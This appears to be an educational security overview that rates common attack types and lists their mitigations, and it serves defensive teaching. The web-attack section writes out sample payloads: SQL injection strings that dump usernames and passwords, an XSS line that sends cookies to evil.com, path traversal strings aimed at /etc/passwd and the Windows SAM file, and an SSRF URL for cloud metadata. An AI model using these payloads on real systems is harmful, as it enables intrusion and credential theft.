1. Social Engineering Attacks

Social engineering exploits human psychology rather than technical vulnerabilities. Attackers manipulate people into breaking security procedures, revealing sensitive information, or performing actions that compromise security.

📧
Phishing
CRITICAL

Fraudulent emails or messages impersonating trusted entities to steal credentials, financial data, or install malware. The #1 initial attack vector worldwide.

  • Email phishing: Mass-sent fake emails with malicious links
  • Spear phishing: Targeted at specific individuals using gathered intel
  • Whaling: Targeting C-suite executives with personalized lures
  • Clone phishing: Duplicating a legitimate previously-delivered email
🗣️
Vishing (Voice Phishing)
CRITICAL

Phone-based social engineering where attackers impersonate IT support, bank staff, or government agencies to extract sensitive information over voice calls.

  • Caller ID spoofing to appear as a trusted number
  • Urgency tactics ("your account will be locked in 10 minutes")
  • Often combined with deepfake voice technology
🎯
Pretexting
HIGH

Creating a fabricated scenario (pretext) to gain a victim's trust and extract information. The attacker invents a persona and storyline to justify their requests.

  • Impersonating a survey taker or co-worker
  • Building rapport over multiple interactions
  • Used as reconnaissance for deeper attacks
🚪
Tailgating
HIGH

Physically following an authorized person through a secured door or gate without using credentials. Exploits human courtesy — people rarely question someone who appears to belong.

  • Following an employee through a badge-access door
  • Pretending to be a delivery driver or contractor
  • Countermeasure: mantraps, security awareness training
🗄️
Baiting / USB Drop
HIGH

Leaving infected USB drives or other media in places where targets will find them (parking lots, lobbies, bathrooms). Curiosity drives the victim to plug it in.

  • USB drive labeled "Employee Salaries 2025"
  • Auto-executes malware via autorun or social engineering prompt
  • Can establish reverse shell back to attacker
🤝
Quid Pro Quo
MEDIUM

A promise of a benefit in exchange for information or access. The attacker offers something of value (a service, gift, or technical help) to manipulate the victim.

  • "I'll fix your computer if you give me your password"
  • Fake IT support calls offering free security scans

2. Network-Based Attacks

These attacks target the network infrastructure itself — routers, switches, protocols, and the data flowing through them. They can disrupt availability, intercept data, or redirect traffic.

💀
DDoS (Distributed Denial of Service)
CRITICAL

Overwhelming a target with traffic from thousands of compromised devices (botnet). The goal is to exhaust bandwidth, server resources, or application capacity.

  • Volumetric: UDP floods, DNS amplification, NTP amplification
  • Protocol: SYN floods, Ping of Death, Smurf attacks
  • Application layer: HTTP floods, Slowloris, Slow POST
🕵️
Man-in-the-Middle (MITM)
CRITICAL

An attacker secretly intercepts and potentially alters communication between two parties who believe they are communicating directly.

  • ARP spoofing: Poisoning the ARP cache to redirect LAN traffic
  • DNS spoofing: Forcing victims to resolve domains to attacker IPs
  • SSL stripping: Downgrading HTTPS to HTTP to intercept traffic
  • WiFi Evil Twin: Rogue access point mimicking a legitimate network
Switch# show ip arp | include <suspicious-mac>
Switch# show mac address-table address <suspicious-mac>
Switch(config)# ip dhcp snooping vlan 1
Switch(config)# ip dhcp snooping
🌐
DNS Spoofing / Cache Poisoning
HIGH

Injecting falsified DNS records into a DNS resolver's cache, causing victims to be redirected to malicious websites.

  • Victim types "bank.com" but resolves to attacker's IP
  • Can be used to distribute malware or steal credentials
  • Mitigation: DNSSEC, use trusted DNS resolvers only
📡
Session Hijacking
HIGH

Taking over an established session after the user has authenticated. The attacker steals the session token to impersonate the user.

  • Session token theft via XSS or network sniffing
  • Session fixation: forcing a victim to use a known session ID
  • Mitigation: HTTPS, HttpOnly cookies, session timeout
🔀
Rogue Access Point
MEDIUM

An unauthorized wireless access point set up within an organization's range to intercept wireless traffic.

  • Signals stronger than legitimate APs to attract clients
  • All traffic routed through attacker's device
  • Detection: wireless IDS, signal mapping, rogue AP detection
🚨
VLAN Hopping
HIGH

Bypassing VLAN segmentation to access traffic on a different VLAN using switch spoofing or double tagging.

  • Switch spoofing: Pretending to be a switch to negotiate a trunk
  • Double tagging: Outer tag stripped by first switch, inner tag forwards to target VLAN
Switch(config)# interface range gigabitEthernet 0/1-24
Switch(config-if-range)# switchport mode access
Switch(config-if-range)# no negotiate auto

3. Application & Web Attacks

These attacks exploit vulnerabilities in web applications, APIs, and software. They are among the most common attack vectors because web apps are exposed to the internet and often contain coding flaws.

💉
SQL Injection (SQLi)
CRITICAL

Injecting malicious SQL code into input fields that are improperly sanitized. The attacker can read, modify, or delete database contents, and sometimes execute system commands.

  • In-band: Same channel for injection and results (UNION-based, error-based)
  • Blind: No direct output (boolean-based, time-based)
  • Out-of-band: Uses DNS/HTTP to exfiltrate data
-- Example SQL injection payload
' OR 1=1; --
' UNION SELECT username, password FROM users --
' OR '1'='1' -- 

-- Mitigation: parameterized queries / prepared statements
-- BAD:  "SELECT * FROM users WHERE id=" + userInput
-- GOOD: "SELECT * FROM users WHERE id=?" (with bound param)
<script>
Cross-Site Scripting (XSS)
CRITICAL

Injecting malicious client-side scripts into web pages viewed by other users. The script executes in the victim's browser with the same permissions as the legitimate site.

  • Reflected XSS: Payload in the URL, reflected back in the response
  • Stored XSS: Payload persisted in the database (forum posts, comments)
  • DOM-based XSS: Payload manipulates the DOM directly, never reaches the server
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
<img src=x onerror="alert('XSS')">

-- Mitigation: output encoding, Content-Security-Policy headers,
-- input validation, use framework auto-escaping
🔄
Cross-Site Request Forgery (CSRF)
HIGH

Tricking an authenticated user into unknowingly submitting a request to a web application where they are already logged in. The attack exploits the browser's automatic inclusion of session cookies.

  • A hidden form on a malicious site submits to the bank's transfer endpoint
  • The victim's browser automatically sends session cookies
  • Mitigation: CSRF tokens, SameSite cookie attribute, referer checking
🔓
Broken Authentication
HIGH

Exploiting weaknesses in authentication mechanisms to assume other users' identities. Includes credential stuffing, brute force, and session management flaws.

  • Credential stuffing: Using leaked username/password pairs from other breaches
  • Brute force: Systematically trying every possible password
  • Session fixation: Forcing a victim to use a predetermined session ID
📁
Directory Traversal / Path Traversal
HIGH

Exploiting insufficient input validation to access files and directories outside the intended folder. Uses dot-dot-slash sequences to traverse the filesystem.

  • ../../../../etc/passwd
  • ....//....//....//windows/system32/config/sam
  • Mitigation: input validation, chroot, allowlist permitted paths
🔗
SSRF (Server-Side Request Forgery)
MEDIUM

Forcing a server to make HTTP requests to an arbitrary domain/IP chosen by the attacker. Used to scan internal networks, access cloud metadata services, or bypass firewalls.

  • ?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
  • Can access internal services not exposed to the internet
  • Mitigation: URL allowlists, disable unnecessary outbound HTTP

4. Malware-Based Attacks

Malware (malicious software) is any software intentionally designed to cause damage. Malware comes in many forms, each with distinct behaviors and objectives.

🔒
Ransomware
CRITICAL

Encrypts the victim's files or locks the entire system, then demands payment for the decryption key. Modern ransomware also exfiltrates data for double extortion.

  • Encrypting: Locky, Ryuk, LockBit, BlackCat/ALPHV
  • Locker: Winlocker (locks the screen, doesn't encrypt)
    • >
  • RaaS: Ransomware-as-a-Service affiliate model
🦠
Trojans / Remote Access Trojans (RATs)
CRITICAL

Malware disguised as legitimate software that creates a backdoor. RATs provide full remote control over the compromised machine.

  • Common RATs: DarkComet, njRAT, Cobalt Strike Beacon
  • Distributed via phishing, fake downloads, USB drops
  • Persists via registry run keys, scheduled tasks
🪱
Worms
HIGH

Self-replicating malware that spreads without user interaction by exploiting network vulnerabilities.

  • Exploits unpatched services (SMB, RDP, email)
  • Historical: ILOVEYOU, Conficker, WannaCry
  • Can spread across entire networks in minutes
📢
Spyware / Adware
HIGH

Covertly monitors user activity (spyware) or displays unwanted advertisements (adware).

  • Keyloggers: Record every keystroke to capture passwords
  • Screen scrapers: Periodically capture screenshots
  • Info-stealers: Collect cookies, passwords, crypto wallets
🏗️
Rootkits
MEDIUM

Stealthy malware that modifies the OS kernel or low-level components to hide its presence from security tools.

  • User-mode: Hooks API calls to hide activity
  • Kernel-mode: Modifies the OS kernel itself
  • Bootkit: Infects the Master Boot Record (MBR)
  • Detection: memory analysis, boot-time scanning
💰
Cryptocurrency Mining Malware
HIGH

Installs cryptocurrency miners on victim machines without consent, consuming CPU/GPU resources.

  • Delivered via phishing, drive-by downloads, compromised containers
  • Often targets cloud environments
  • Detection: abnormal CPU usage, mining pool connections

5. Advanced & Persistent Threats

Sophisticated, long-term attack campaigns orchestrated by nation-state actors or well-funded cybercriminal groups. They use multiple vectors simultaneously and maintain persistent access over months or years.

🏛️
APT (Advanced Persistent Threat)
CRITICAL

Prolonged, targeted cyberattack in which an attacker gains access to a network and remains undetected for an extended period.

  • Known APT groups: APT29 (Cozy Bear), APT28 (Fancy Bear), Lazarus
  • Kill chain: Recon → Weaponize → Deliver → Exploit → Install → C2 → Act
  • Focus: intellectual property, state secrets, critical infrastructure
0DAY
Zero-Day Exploits
CRITICAL

Exploiting a software vulnerability unknown to the vendor with no patch available. Zero-day exploits can sell for $100K-$2M+.

  • Used heavily in APT campaigns and targeted attacks
  • Can be in OS, browsers, firmware, or ICS software
  • Mitigation: defense-in-depth, behavior detection
🎯
Supply Chain Attack
HIGH

Compromising a trusted third-party supplier to distribute malware through legitimate update channels.

  • SolarWinds (2020): Malicious code in Orion platform updates
  • Codecov (2021): Compromised bash uploader script
  • 3CX (2023): Trojanized desktop app update
🔄
Polymorphic / Metamorphic Malware
HIGH

Malware that changes its code signature every time it replicates, making it invisible to signature-based antivirus detection.

  • Each infected file has a unique signature
  • Requires behavior-based or heuristic detection
  • Often used as the first stage in APT payloads

6. Risk Assessment Matrices

Risk matrices help security teams prioritize which threats to address first based on likelihood and impact. Not all attacks require the same level of investment in defenses.

How to Use These Matrices

  • Act Fast (Red Zone): These are your immediate priorities. Allocate budget, staff, and tools here first.
  • Manage (Yellow Zone): Implement controls within a planned timeline. These may not be imminent but would cause significant damage.
  • Monitor (Green Zone): Track through threat intelligence feeds. Don't over-invest, but have a response plan ready.
